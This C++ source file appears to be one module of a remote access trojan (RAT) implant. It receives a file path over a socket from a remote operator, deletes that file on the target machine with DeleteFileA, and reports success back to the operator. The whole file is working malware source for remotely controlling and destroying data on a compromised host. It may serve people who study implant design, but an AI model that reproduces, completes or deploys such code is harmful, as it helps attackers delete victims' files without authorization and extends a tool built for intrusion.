// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-DeleteFile.cpp : Defines functionality for performing a delete file on target, i.e., deleting a file off target at a specified path

#include "RAT-Dll-DeleteFile.h"
#include "RAT-Dll-Connect.h"


/** Handle socket work and function calls for performing delete file functionality
params:
* clientSock - current open client socket to implant
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleDeleteFile(__in SOCKET clientSock)
{
	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
	CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];

    // Get the file path
    status = recv(clientSock, recvBuf, recvBufLen, 0);
    if (status == SOCKET_ERROR)
    {
        // TODO: have a function call to send back failure? Request a resend?
        sprintf_s(msgBuf, "RAT-Dll-DeleteFile::handleDeleteFile - Failed to recv (file path) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup; // keep trying to do things until we disconnect or receive a cleanup message
    }

    status = performDeleteFile(recvBuf);
    if (status != SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Dll-DeleteFile::handleDeleteFile - Failure recevied from performDeleteFile %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    // Send back success status code
    status = send(clientSock, "SUCCESS", 7, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-DeleteFile::handleDeleteFile - Failure recevied from send (status code) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        status = WSAGetLastError();
        goto cleanup;
    }


cleanup:
	return status;
}


/** This function will perform a delete file for us
params:
* filePath - path to file on target we're deleting
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performDeleteFile(__in char* filePath)
{
	INT status = SUCCESS;
	CHAR msgBuf[DEFAULT_BUF_LEN];

	sprintf_s(msgBuf, "RAT-Dll-DeleteFile::performDeleteFile - Deleting %s...\n", filePath);
	OutputDebugStringA(msgBuf);

	if (!DeleteFileA(filePath))
	{
		OutputDebugStringA("RAT-Dll-DeleteFile::performDeleteFile - Failed to delete file!\n");
		status = FAILURE;
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-DeleteFile::performDeleteFile - Successfully deleted file!\n");

cleanup:
	return status;
}